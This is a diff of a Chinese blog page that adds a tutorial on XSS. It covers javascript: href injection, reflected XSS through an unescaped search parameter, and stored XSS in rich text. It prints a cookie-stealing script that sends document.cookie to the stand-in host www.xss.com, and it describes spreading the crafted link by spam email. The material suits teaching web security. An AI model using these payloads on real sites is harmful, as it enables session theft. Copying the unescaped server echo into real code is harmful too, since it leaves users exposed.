@@ -376,7 +376,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  674
+                  2,813
                 </span>
               
 
@@ -392,7 +392,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  3
+                  11
                 </span>
               
             </div>
@@ -480,9 +480,164 @@ btn.onclick = ()=&gt;{
   span.innerHTML = value;
 }
 </code></pre><p>修改，在js中添加eval方法。</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fkekri3v03j311s0d4t9w.jpg" alt=""></p>
+<p>这样的话，alert就可以在js环节执行了</p>
+<p>但eval这个方法，本身就不被推荐使用，所以这种低级的场景应该很少。</p>
 <p><br></p>
 <h2 id="4，第一小节总结"><a href="#4，第一小节总结" class="headerlink" title="4，第一小节总结"></a>4，第一小节总结</h2><p>1，通过innerHTML方式注入script的方式，失败<br>2，突破js的方案，失败<br>3，eval方法，成功</p>
 <p>可以看出，不是很系统了解过xss攻击的人，其实很难形成有效的攻击，毕竟w3c和ECMA委员会也不是吃干饭的，常见的基础型漏洞，都已经被修复的很完美。</p>
+<h1 id="二，xss攻击入门"><a href="#二，xss攻击入门" class="headerlink" title="二，xss攻击入门"></a>二，xss攻击入门</h1><p>前面的尝试，基本都以失败告终。</p>
+<p>现在开始尝试真正的攻击：</p>
+<h2 id="1，href攻击"><a href="#1，href攻击" class="headerlink" title="1，href攻击"></a>1，href攻击</h2><p>业务场景中，经常有这样一种情况，就是采集到数据后，拼接在href上，用于带到下一个页面，进行数据传递。</p>
+<p>例如：当前需求为</p>
+<pre><code>1，获取用户信息
+2，添加到href的位置
+</code></pre><p>html+js代码如下：</p>
+<pre><code>&lt;body&gt;
+  &lt;div class=&quot;lead&quot;&gt;
+    您输入的用户名为：
+    &lt;a id=&quot;name&quot; href=&quot;a.html&quot;&gt;a标签跳转&lt;/a&gt;
+    &lt;/span&gt;
+  &lt;/div&gt;
+  &lt;input class=&quot;col-sm-3 form-control&quot; type=&quot;text&quot; id=&quot;text&quot;/&gt;
+  &lt;button class=&quot;btn btn-default&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;
+&lt;/body&gt;
+
+&lt;script&gt;
+    let btn = document.querySelector(&quot;button&quot;);
+    let input = document.querySelector(&quot;#text&quot;);
+    let a = document.querySelector(&quot;#name&quot;);
+
+    btn.onclick = ()=&gt;{
+      let value = input.value;
+      a.href = value;
+    }
+&lt;/script&gt;
+</code></pre><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fkemlgqdyej30mm092aam.jpg" alt=""></p>
+<p>此时输入javascript:alert(1),然后点击提交，可以看到a标签href的变化</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fkemmj1nlxj30o802aglz.jpg" alt=""></p>
+<p>此时点击a标签，即发现alert成功弹出了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fkemnf0fu0j312a0e4jsl.jpg" alt=""></p>
+<p>虽然攻击成功了，但当前的场景也并不多见。</p>
+<h2 id="2，href攻击增强"><a href="#2，href攻击增强" class="headerlink" title="2，href攻击增强"></a>2，href攻击增强</h2><p>业务中，经常会遇到搜索的需求。</p>
+<p>例：将搜索的内容传递给服务器，服务器根据搜索的内容，返回响应的页面内容。</p>
+<p>现在修改一下之前的代码</p>
+<pre><code>&lt;body&gt;
+    &lt;input class=&quot;col-sm-3 form-control&quot; type=&quot;text&quot; id=&quot;text&quot;/&gt;
+    &lt;button class=&quot;btn btn-default&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;
+&lt;/body&gt;
+&lt;script&gt;
+    let btn = document.querySelector(&quot;button&quot;);
+    let input = document.querySelector(&quot;#text&quot;);
+    let a = document.querySelector(&quot;#name&quot;);
+
+    btn.onclick = ()=&gt;{
+      let value = input.value;
+      location.href = &apos;/users?search=&apos;+value;
+    }
+&lt;/script&gt;
+</code></pre><p>现在我们的html只有一个input输入和一个button提交</p>
+<p>而js的功能则是将input输入的内容，拼接在链接中</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fkf9r2vd3pj30me05274o.jpg" alt=""></p>
+<p>此时我们输入一些带有攻击性的内容，点击提交</p>
+<pre><code>http://localhost:3000/users?search=%3Cscript%3Edocument.write(1)%3C/script%3E
+</code></pre><p>此时，页面进行了跳转，并将有危险的代码拼接在了url上</p>
+<p>该请求发送到了服务器上，例如下面是服务器对应的处理逻辑：</p>
+<pre><code>router.get(&apos;/users&apos;, function (ctx, next) {
+  ctx.body = &quot;&lt;div&gt;&quot;+ctx.query.search+&quot;&lt;/div&gt;&quot;;
+})
+
+1，服务器匹配了users路由，并执行了对应的处理逻辑
+
+2，处理逻辑中，提取了请求传入的search字段参数，返回给了前端。
+</code></pre><p>ok，可以看到服务器没有任何处理，这样的话，我们的script代码便会被返回给浏览器，因为没有使用innerHTMLapi，所以浏览器会正常的解析。</p>
+<h3 id="但是…攻击真的会成功吗？"><a href="#但是…攻击真的会成功吗？" class="headerlink" title="但是…攻击真的会成功吗？"></a>但是…攻击真的会成功吗？</h3><p>那么我们测试一下</p>
+<p>此时url为：</p>
+<p><a href="http://localhost:3000/users?search=%3Cscript%3Edocument.write(1)%3C/script%3E" target="_blank" rel="external">http://localhost:3000/users?search=%3Cscript%3Edocument.write(1)%3C/script%3E</a></p>
+<p>chrome显示：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fkf9z3c0m1j30j80hu0uk.jpg" alt=""></p>
+<p>可以看到攻击被拦截了！</p>
+<p>但是从chrome返回的内容，可以得出几个结论：</p>
+<pre><code>1，攻击成功了，触发了chrome的防御功能。
+2，浏览器早已发现了这个问题，所以已经有了解决方案。
+3，虽然攻击被防御了，但至少证明了，这确实是一种有攻击力的攻击方式。
+</code></pre><p>毕竟chrome是浏览器行业的领头羊，有解决方案也不意外。<br>但是其他的浏览器呢？<br>如果有其他浏览器存在这个漏洞呢？</p>
+<p><strong>经测试！！！</strong></p>
+<p>pc端的现代浏览器，都有防御方案，不会出现上述问题。</p>
+<h3 id="还有没有其他机会？"><a href="#还有没有其他机会？" class="headerlink" title="还有没有其他机会？"></a>还有没有其他机会？</h3><p>既然pc端不可以，那么移动端呢，毕竟移动端是基于webview的，webview毕竟是阉割版，会不会有问题呢？</p>
+<p>那么测试一下，移动端uc，chrome，360等，经测试，<strong>攻击无效！！</strong></p>
+<p>虽然攻击无效，但是各移动端浏览器，都没有友善的提示信息，全都是白屏。</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fkfbis6xbqj30o80h6q3m.jpg" alt=""></p>
+<pre><code>其实这个证明不了什么，只能说明web端的浏览器确实是阉割版。
+</code></pre><h3 id="难道真的没有可能吗？"><a href="#难道真的没有可能吗？" class="headerlink" title="难道真的没有可能吗？"></a>难道真的没有可能吗？</h3><p>其实在移动端，对主流浏览器测试，肯定没有问题，毕竟浏览器厂商也不是吃干饭的。</p>
+<p>但如果不是各大浏览器呢，而是原生的webview呢？</p>
+<p>例如各种app中嵌入的h5呢</p>
+<p>这里测试了一个ios应用，使用的是原生的webview，调用的是最普通的浏览器内核，同样是上面的攻击方式。</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fkfbuxigdcj30p40wsmz4.jpg" alt=""></p>
+<p>可以看到，页面中输出了一个1！</p>
+<p>这说明：</p>
+<pre><code>1，原生webview确实存在漏洞
+2，移动端各主流浏览器，或者使用了非原生内核（腾讯x5），或者添加了防御机制。
+3，很多ios或者android开发者无法意识到这一点。
+</code></pre><h2 id="3，攻击之后呢？"><a href="#3，攻击之后呢？" class="headerlink" title="3，攻击之后呢？"></a>3，攻击之后呢？</h2><p>前面，已经成功将我们所写的js注入到了页面当中。</p>
+<p>既然这样的话，我们就能干很多事情了，例如：</p>
+<pre><code>&lt;script&gt;
+     var img = new Image();
+    img.src = &quot;http://www.xss.com/getcookie?cookie=&quot; + document.cookie;
+    document.body.append(img);
+&lt;/script&gt;
+</code></pre><p>如上，就是通过漏洞注入script代码，获取cookie并发送到远程服务器</p>
+<p>上面这种向代码中添加script脚本的方式，其实就是XSS</p>
+<h1 id="三，xss攻击晋级"><a href="#三，xss攻击晋级" class="headerlink" title="三，xss攻击晋级"></a>三，xss攻击晋级</h1><h2 id="1，demo存在的问题"><a href="#1，demo存在的问题" class="headerlink" title="1，demo存在的问题"></a>1，demo存在的问题</h2><p>前面的例子，其实还存在问题：</p>
+<pre><code>1，当前操作人，是开发者||黑客自身
+2，获取的cookie也还是自己的
+</code></pre><p>这其实是没什么意义的，如果是开发者或黑客自己，给自己注入js，本身就是个无聊的行为。</p>
+<p>与其这样，还不如用fiddler代理一下文件，不就有了新的js嘛。</p>
+<p>其实，攻击的目的，肯定不是自己瞎折腾，而是想要将攻击以病毒的方式的扩散出去。</p>
+<p>前面，我们不是有个链接嘛：</p>
+<pre><code>http://localhost:3000/users?search=
+&lt;script&gt;
+    var img = new Image();
+    img.src = &quot;http://www.xss.com/getcookie?cookie=&quot; + document.cookie;
+    document.body.append(img);
+&lt;script&gt;
+</code></pre><p>现在这个链接的xss漏洞已经被我们确认存在了，并且在移动端进入该页面的话，就会执行相应的脚本，盗取cookie</p>
+<p>既然如此，我们可以换一个角度。</p>
+<pre><code>1，将这个链接扩散出去
+2，想办法，让登陆过这个网站的人，点击这个链接，并进入该页面
+</code></pre><p>这种攻击，即符合同源策略，也比较容易实现。</p>
+<p>最常见的，就是qq邮箱中的各种垃圾邮件。</p>
+<p>例如：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fkfeuxt24fj30ks0tm43e.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fkfey00f4oj30e803s0td.jpg" alt=""></p>
+<pre><code>1，邮件中包含了一个链接。
+2，如果这个链接是拼接好的baidu的某个xss攻击链接。
+3，当点击之后，进入百度的某个页面。
+4，xss脚本执行，获取了百度账号的cookie，发送到了远程服务器。
+</code></pre><h2 id="2，xss分类"><a href="#2，xss分类" class="headerlink" title="2，xss分类"></a>2，xss分类</h2><p>ok，前面我们已经了解过了一种xss攻击方式，就是生成一个链接，让其他人去点击。</p>
+<h5 id="存在的问题："><a href="#存在的问题：" class="headerlink" title="存在的问题："></a>存在的问题：</h5><p>毕竟还是要生成链接，而且扩散费劲，还需要用户手动点击，总的来说不够理想。</p>
+<p>那么有没有更快捷的攻击方式。</p>
+<p>回顾一下，前面的攻击流程：</p>
+<pre><code>1，search中输入攻击代码，发送到服务器
+2，服务器将攻击代码返回给客户端
+3，客户端解析
+</code></pre><p>前面的攻击之所以能够成功，有一个关键点，就是：</p>
+<h5 id="“客户端解析”"><a href="#“客户端解析”" class="headerlink" title="“客户端解析”"></a>“客户端解析”</h5><p>只要被客户端成功解析，就能够成功攻击。</p>
+<p>经过第一节，我们清楚，前端一个人不通过服务器，在前端折腾，其实比较难造成有效的攻击。</p>
+<p>而从服务器返回的攻击代码却很容易被浏览器解析。</p>
+<p>既然这样，我们就明确了一个方向：</p>
+<h5 id="“攻击的代码最好是从服务器吐出来的”"><a href="#“攻击的代码最好是从服务器吐出来的”" class="headerlink" title="“攻击的代码最好是从服务器吐出来的”"></a><strong>“攻击的代码最好是从服务器吐出来的”</strong></h5><p>既然如此，那如果我们的攻击代码，就存储在数据库里，岂不是最好。</p>
+<p><strong>没错</strong>，很多<strong>富文本</strong>编辑功能的应用就存在这个问题，例如：</p>
+<pre><code>这是一个晴朗的午后,&lt;script&gt;alert(1)&lt;/script&gt;
+
+1，上面的文本，被当作文章保存到数据库。
+2，展示给其他用户观看。
+3，凡是观看到的用户，都会被攻击
+</code></pre><p>两种常见的工具方式都已经了解过了</p>
+<p>其中，第一种通过生成链接的方式进行攻击，叫做：</p>
+<h4 id="“反射型xss”"><a href="#“反射型xss”" class="headerlink" title="“反射型xss”"></a>“反射型xss”</h4><p>反射型，可以简单理解成，给服务器发什么，服务器就返回什么，就像小学生打王者，骂不过的一句“反弹”</p>
+<p>而，第二种富文本夹带攻击代码的方式，叫做：</p>
+<h4 id="“存储型xss”"><a href="#“存储型xss”" class="headerlink" title="“存储型xss”"></a>“存储型xss”</h4><p>存储型，主要是攻击代码已经被保存到服务器，所有用户都能够被攻击，危害比反射型要高，主要体现在博客论坛等。</p>
 
           
         
@@ -1831,7 +1986,7 @@ npm:2.15.0
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共11.1k字</span>
+  <span class="post-count">博客全站共13.3k字</span>
 </div>
 <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
 
